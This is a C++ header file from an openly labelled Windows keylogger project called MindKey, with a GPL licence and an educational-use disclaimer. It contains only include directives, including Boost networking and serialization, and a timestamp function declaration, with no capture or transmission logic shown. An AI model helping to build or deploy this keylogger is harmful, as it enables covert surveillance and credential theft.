/* MindKey, Keylogger for Windows.
* While this program can potentially be used for nefarious purposes,
* it was written for educational and recreational purposes only
* and the author does not endorse illegal use.
*
* Copyright (C) 2013 - 2014 Blackhack <https://github.com/blackhack/MindKey/>
*
* This program is free software: you can redistribute it and/or modify
* it under the terms of the GNU General Public License as published by
* the Free Software Foundation, either version 3 of the License, or
* (at your option) any later version.
*
* This program is distributed in the hope that it will be useful,
* but WITHOUT ANY WARRANTY; without even the implied warranty of
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
* GNU General Public License for more details.
*
* You should have received a copy of the GNU General Public License
* along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

#pragma once

#ifdef _WIN32
#define _WIN32_WINNT 0x0501
#endif

#include <iostream>
#include <sstream>
#include <ostream>
#include <time.h>
#include <list>
#include <iostream>
#include <fstream>
#include <ostream>
#include <vector>
#include <iomanip>
#include <string>
#include <array>

#include <thread>
#include <mutex>
#include <chrono>
#include <functional>

#include <boost/asio.hpp>
#include <boost/bind.hpp>
#include <boost/lexical_cast.hpp>
#include <boost/serialization/vector.hpp>
#include <boost/date_time/posix_time/posix_time.hpp>
#include <boost/archive/text_iarchive.hpp>
#include <boost/archive/text_oarchive.hpp>
#include <boost/tuple/tuple.hpp>

#include "connection.h"
#include "dataStruct.h"

std::string TimeStamp();
